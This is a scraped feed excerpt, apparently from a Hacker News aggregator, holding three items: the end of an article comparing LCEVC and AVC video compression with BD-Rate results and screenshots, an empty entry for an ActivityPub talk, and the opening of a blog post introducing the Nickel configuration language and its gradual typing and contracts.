https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?resize=400%2C300&amp;ssl=1 400w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?resize=200%2C150&amp;ssl=1 200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?resize=678%2C509&amp;ssl=1 678w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?resize=326%2C245&amp;ssl=1 326w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?resize=80%2C60&amp;ssl=1 80w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/parkjoy_b_avc_vmaf.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li></ul></figure>



<p>Again, as you can see, there is an immediate benefit to using LCEVC over H.264/AVC alone <strong>with a -20% BD-Rate value that indicates a savings of 20% for LCEVC over AVC at equivalent video quality.</strong></p>



<p>Now, let’s switch over to the CrowdRun sequence and repeat these tests.</p>



<h2><span id="CrowdRun_%E2%80%93_LCEVC_vs_AVC"></span>CrowdRun – LCEVC vs AVC<span></span></h2>



<p>I then repeated the experiments using the CrowdRun sequence, 1080p50 with the output being 1080p50. </p>



<h3><span id="Expt_1_CBR_using_an_IPPP_Structure_(no_Bpictures)-2"></span>Expt 1. CBR using an IPPP Structure (no B-pictures)<span></span></h3>



<p>Here are the results for the CrowdRun sequence with only P-pictures. </p>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/ottverse.com\/lcevc-vs-avc-using-ffmpeg\/&quot;}"><li><figure><img data-attachment-id="782" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/crowdrun_ipp_avc_psnr-2/" data-orig-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?fit=800%2C600&amp;ssl=1" data-orig-size="800,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="crowdrun_ipp_avc_psnr-2" data-image-description="" data-medium-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?fit=800%2C600&amp;ssl=1" loading="lazy" width="800" height="600" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" alt="" data-id="782" data-full-url="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?resize=800%2C600&amp;ssl=1" data-link="https://ottverse.com/?attachment_id=782" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?w=800&amp;ssl=1 800w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?resize=300%2C225&amp;ssl=1 300w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?resize=768%2C576&amp;ssl=1 768w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?resize=400%2C300&amp;ssl=1 400w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?resize=200%2C150&amp;ssl=1 200w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?resize=678%2C509&amp;ssl=1 678w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?resize=326%2C245&amp;ssl=1 326w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?resize=80%2C60&amp;ssl=1 80w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_psnr-2.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li><li><figure><img data-attachment-id="783" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/crowdrun_ipp_avc_vmaf-2/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?fit=800%2C600&amp;ssl=1" data-orig-size="800,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="crowdrun_ipp_avc_vmaf-2" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?fit=800%2C600&amp;ssl=1" loading="lazy" width="800" height="600" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" alt="" data-id="783" data-full-url="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?resize=800%2C600&amp;ssl=1" data-link="https://ottverse.com/?attachment_id=783" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?w=800&amp;ssl=1 800w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?resize=400%2C300&amp;ssl=1 400w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?resize=200%2C150&amp;ssl=1 200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?resize=678%2C509&amp;ssl=1 678w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?resize=326%2C245&amp;ssl=1 326w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?resize=80%2C60&amp;ssl=1 80w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_ipp_avc_vmaf-2.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li></ul><figcaption><strong>Click for full size plots</strong></figcaption></figure>







<p>Similar to what we saw in the ParkJoy experiments, LCEVC delivers a substantial gain in terms of video quality at a given bitrate. This is backed up by the PSNR and VMAF data. </p>



<div data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/ottverse.com\/lcevc-vs-avc-using-ffmpeg\/&quot;}"><div data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/ottverse.com\/lcevc-vs-avc-using-ffmpeg\/&quot;}">
<h3><span id="Expt_2_CBR_using_Bpictures-2"></span>Expt 2. CBR using B-pictures<span></span></h3>



<p>Here are the results for the CrowdRun sequence after enabling B-pictures. </p>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/ottverse.com\/lcevc-vs-avc-using-ffmpeg\/&quot;}"><li><figure><img data-attachment-id="778" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/crowdrun_b_avc_psnr-2/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?fit=800%2C600&amp;ssl=1" data-orig-size="800,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="crowdrun_b_avc_psnr-2" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?fit=800%2C600&amp;ssl=1" loading="lazy" width="800" height="600" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" alt="" data-id="778" data-full-url="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?resize=800%2C600&amp;ssl=1" data-link="https://ottverse.com/?attachment_id=778" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?w=800&amp;ssl=1 800w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?resize=400%2C300&amp;ssl=1 400w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?resize=200%2C150&amp;ssl=1 200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?resize=678%2C509&amp;ssl=1 678w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?resize=326%2C245&amp;ssl=1 326w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?resize=80%2C60&amp;ssl=1 80w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_psnr-2.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li><li><figure><img data-attachment-id="779" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/crowdrun_b_avc_vmaf-2/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?fit=800%2C600&amp;ssl=1" data-orig-size="800,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="crowdrun_b_avc_vmaf-2" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?fit=300%2C225&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?fit=800%2C600&amp;ssl=1" loading="lazy" width="800" height="600" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" alt="" data-id="779" data-full-url="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?resize=800%2C600&amp;ssl=1" data-link="https://ottverse.com/?attachment_id=779" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?w=800&amp;ssl=1 800w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?resize=300%2C225&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?resize=768%2C576&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?resize=400%2C300&amp;ssl=1 400w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?resize=200%2C150&amp;ssl=1 200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?resize=678%2C509&amp;ssl=1 678w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?resize=326%2C245&amp;ssl=1 326w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?resize=80%2C60&amp;ssl=1 80w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowdrun_b_avc_vmaf-2.png?resize=800%2C600&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></li></ul><figcaption><strong>Click for full size plots</strong></figcaption></figure>




</div></div>



<p>Again, we can see that the difference is quite obvious and that underscores the benefit of adopting the LCEVC coding standard. </p>



<p><strong>The PSNR vs Bitrate plot translates to a 24.53% bitrate savings (using BD-Rate calculations) for LCEVC over AVC at equivalent video quality. </strong></p>



<h2><span id="Screenshots"></span>Screenshots <span></span></h2>



<p><strong>Whatever the objective metrics say, I believe that visual comparison is important and has to be performed when you are comparing codecs. You cannot rely only on the objective metrics to derive your conclusions</strong></p>



<p>So, let’s take a look at screenshots from the ParkJoy and CrowdRun experiments. I took care to ensure that the same picture-types are being compared.</p>



<p>The images below are from the ParkJoy sequence encoded at 108p50, 3600 kbps. The image on the left is from the LCEVC bitstream and the image to the right is from the AVC bitstream.</p>



<figure><ul data-carousel-extra="{&quot;blog_id&quot;:1,&quot;permalink&quot;:&quot;https:\/\/ottverse.com\/lcevc-vs-avc-using-ffmpeg\/&quot;}"><li><figure><img data-attachment-id="807" data-permalink="https://ottverse.com/output_lcevc_08/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?fit=1920%2C1080&amp;ssl=1" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="output_lcevc_08" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?fit=1024%2C576&amp;ssl=1" loading="lazy" width="1024" height="576" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" alt="lcevc mpeg5 part2 vnova" data-id="807" data-full-url="https://ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg" data-link="https://ottverse.com/output_lcevc_08/" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?resize=1536%2C864&amp;ssl=1 1536w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?resize=1200%2C675&amp;ssl=1 1200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?resize=678%2C381&amp;ssl=1 678w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?w=1920&amp;ssl=1 1920w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/output_lcevc_08.jpg?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Parkjoy, LCEVC</figcaption></figure></li><li><figure><img data-attachment-id="806" data-permalink="https://ottverse.com/output_avc_08/" data-orig-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?fit=1920%2C1080&amp;ssl=1" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="output_avc_08" data-image-description="" data-medium-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?fit=300%2C169&amp;ssl=1" data-large-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?fit=1024%2C576&amp;ssl=1" loading="lazy" width="1024" height="576" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" alt="lcevc mpeg5 part2 vnova" data-id="806" data-full-url="https://ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg" data-link="https://ottverse.com/output_avc_08/" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?resize=1024%2C576&amp;ssl=1 1024w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?resize=768%2C432&amp;ssl=1 768w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?resize=1536%2C864&amp;ssl=1 1536w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?resize=1200%2C675&amp;ssl=1 1200w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?resize=678%2C381&amp;ssl=1 678w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?w=1920&amp;ssl=1 1920w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/output_avc_08.jpg?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Parkjoy, AVC</figcaption></figure></li></ul></figure>



<p>If you click on the images above and switch back and forth, it’s quite easy to see the difference in the quality between LCEVC and AVC especially on the grass bank, and the bark of the tree. If you look closely, you can see that …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/">https://ottverse.com/lcevc-vs-avc-using-ffmpeg/</a></em></p>]]>
            </description>
            <link>https://ottverse.com/lcevc-vs-avc-using-ffmpeg/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24859703</guid>
            <pubDate>Thu, 22 Oct 2020 16:20:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Activity Pub Ecosystem]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24859314">thread link</a>) | @brianzelip
<br/>
October 22, 2020 | https://conf.tube/videos/watch/c79457a9-aae5-47dd-8731-617e6b09fe06 | <a href="https://web.archive.org/web/*/https://conf.tube/videos/watch/c79457a9-aae5-47dd-8731-617e6b09fe06">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://conf.tube/videos/watch/c79457a9-aae5-47dd-8731-617e6b09fe06</link>
            <guid isPermaLink="false">hacker-news-small-sites-24859314</guid>
            <pubDate>Thu, 22 Oct 2020 15:49:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nickel: Better Configuration for Less]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 60 (<a href="https://news.ycombinator.com/item?id=24858456">thread link</a>) | @figomore
<br/>
October 22, 2020 | https://www.tweag.io/blog/2020-10-22-nickel-open-sourcing/ | <a href="https://web.archive.org/web/*/https://www.tweag.io/blog/2020-10-22-nickel-open-sourcing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>We are making the <a href="https://www.github.com/tweag/nickel">Nickel</a> repository public. Nickel is an experimental configuration
language developed at Tweag. While this is not the time for the first
release yet, it is an occasion to talk about this project. The goal of this
post is to give a high-level overview of the project. If your curiosity is tickled
but you are left wanting to learn more, fear not, as we will publish
more blog posts on specific aspects of the language in the future. But for
now, let’s have a tour!</p>
<p>[<strong>Disclaimer</strong>: the actual syntax of Nickel being still worked on, I’m freely
using as-of-yet non-existing syntax for illustrative purposes. The underlying
features are however already supported.]</p>
<h2>The inception</h2>
<p>We, at Tweag, are avid users of the <a href="https://nixos.org/">Nix</a> package manager. As it
happens, the configuration language for Nix (also called Nix) is
a pretty good configuration language, and would be applicable to many
more things than just package management.</p>
<p>All in all, the Nix language is a lazy JSON with functions. It is
simple yet powerful. It is used to generate Nix’s package descriptions
but would be well
suited to write any kind of configuration (<a href="https://www.terraform.io/">Terraform</a>,
<a href="https://kubernetes.io/">Kubernetes</a>, etc…).</p>
<p>The rub is that the interpreter for Nix-the-language is tightly
coupled with Nix-the-package manager. So, as it stands, using the
Nix language for anything else than package management is a rather
painful exercise.</p>
<p>Nickel is our attempt at answering the question: what would
Nix-the-language look like if it was split from the package manager?
While taking the opportunity to improve the language a little,
building on the experience of the Nix community over the years.</p>
<h2>What’s Nickel, exactly ?</h2>
<p>Nickel is a lightweight generic configuration language. In that it can
replace YAML as your application’s configuration language. Unlike
YAML, though, it anticipates large configurations by being
programmable. Another way to use Nickel is to generate static
configuration files — <em>e.g.</em> in JSON, YAML — that are then fed to another system. Like
Nix, it is designed to have a simple, well-understood core: at its
heart, it is JSON with functions.</p>
<p>But past experience with Nix also brings some insights on which aspects of the
language could be improved. Whatever the initial scope of a language is, it will
almost surely be used in a way that deviates from the original plan: you create
a configuration language to describe software packages, and next thing you know,
somebody needs to implement a <a href="https://github.com/NixOS/nixpkgs/pull/11484">topological sort</a>.</p>
<p>Nickel strives to retain the simplicity of Nix, while extending it
according to this feedback.
Though, you can do perfectly fine without the new features and just write Nix-like code.</p>
<h2>Yet another configuration language</h2>
<p>At this point you’re probably wondering if this hasn’t already been done elsewhere.
It seems that more and more languages are born every day, and surely there
already exist configuration languages with a similar purpose to Nickel:
<a href="https://github.com/bazelbuild/starlark">Starlark</a>, <a href="https://jsonnet.org/">Jsonnet</a>, <a href="https://dhall-lang.org/">Dhall</a> or <a href="https://cuelang.org/">CUE</a>, to name
a few. So why Nickel?</p>
<h2>Typing</h2>
<p>Perhaps the most important difference with other configuration languages is
Nickel’s approach to typing.</p>
<p>Some languages, such as <a href="https://jsonnet.org/">Jsonnet</a> or <a href="https://github.com/bazelbuild/starlark">Starlark</a>, are not
statically typed. Indeed, static types can be seen as superflous in a configuration
language: if your program is only run once on fixed inputs, any type error will
be reported at run-time anyway. Why bother with a static type system?</p>
<p>On the other hand, more and more systems rely on complex configurations, such as
cloud infrastructure (<a href="https://www.terraform.io/">Terraform</a>, <a href="https://kubernetes.io/">Kubernetes</a> or
<a href="https://github.com/NixOS/nixops">NixOps</a>), leading the corresponding programs to become increasingly
complex, to the point where static types are beneficial. For reusable code —
that is, library functions — static types add structure, serve as
documentation, and eliminate bugs early.</p>
<p>Although less common, some configuration languages are statically typed,
including <a href="https://dhall-lang.org/">Dhall</a> and <a href="https://cuelang.org/">CUE</a>.</p>
<p>Dhall features a powerful type system that is able to type a wide range of
idioms. But it is complex, requiring some experience to become fluent in.</p>
<p>CUE is closer to what we are striving for. It has an optional and well-behaved
type system with strong guarantees. In exchange for which, one can’t write nor
type higher-order functions in general, even if some simple functions are
possible to encode.</p>
<h3>Gradual typing</h3>
<p>Nickel, features a <a href="https://en.wikipedia.org/wiki/Gradual_typing"><em>gradual type system</em></a>.
Gradual types are unobtrusive: they make it possible to statically
type reusable parts of your programs, but you are still free to write
configurations without any types. The
interpreter safely handles the interaction between the typed and untyped worlds.</p>
<p>Concretely, typed library code like this:</p>
<div data-language="text"><pre><code>// file: mylib.ncl
{
  numToStr : Num -&gt; Str = fun n =&gt; ...;
  makeURL : Str -&gt; Str -&gt; Num -&gt; Str = fun proto host port =&gt;
    "${proto}://${host}:${numToStr port}/";
}</code></pre></div>
<p>can coexist with untyped configuration code like this:</p>
<div data-language="text"><pre><code>// file: server.ncl
let mylib = import "mylib.ncl" in
let host = "myproject.com" in
{
  host = host;
  port = 1;
  urls = [
    mylib.makeURL "myproto" host port,
    {protocol = "proto2"; server = "sndserver.net"; port = 4242}
  ];
}</code></pre></div>
<p>In the first snippet, the body of <code>numToStr</code> and <code>makeURL</code> are statically
checked: wrongfully calling <code>numToStr proto</code> inside <code>makeURL</code> would raise an
error even if <code>makeURL</code> is never used. On the other hand, the second snippet is
not annotated, and thus not statically checked. In particular, we mix an URL
represented as a string together with one represented as a record in the same
list. The interpreter rather inserts run-time checks, or <em>contracts</em>, such
that if <code>makeURL</code> is misused then the program fails with an
appropriate error.</p>
<p>Gradual types also lets us keep the type system simple: even in
statically typed code if you want to write a component that the type
checker doesn’t know how to verify, you don’t have to type-check that
part.</p>
<h3>Contracts</h3>
<p>Complementary to the static type system, Nickel offers <em>contracts</em>. Contracts
offer precise and accurate dynamic type error reporting, even in the
presence of function types. Contracts are used internally by
Nickel’s interpreter to insert guards at the boundary between typed and untyped
chunks. Contracts are available to the programmer as well, to give them the
ability to enforce type assertions at run-time in a simple way.</p>
<p>One pleasant consequence of this design is that the exposure of the user to the
type system can be progressive:</p>
<ul>
<li>Users writing configurations can just write Nix-like code while ignoring
(almost) everything about typing, since you can seamlessly call a typed
function from untyped code.</li>
<li>Users writing consumers or verifiers of these configurations would use
contracts to model data schemas.</li>
<li>Users writing libraries would instead use the static type
system.</li>
</ul>
